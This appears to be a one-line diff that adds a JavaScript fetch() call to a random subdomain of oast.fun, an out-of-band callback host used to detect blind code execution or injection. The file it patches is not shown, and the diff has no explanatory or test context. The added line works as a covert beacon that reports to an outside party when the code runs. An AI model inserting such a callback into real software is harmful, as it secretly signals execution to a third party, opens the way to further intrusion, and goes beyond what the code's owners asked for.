@@ -1,0 +1,1 @@
+fetch(`https://cpq81c9ucph0k1p4nv90oxzk4x5tuhs57.oast.fun`)
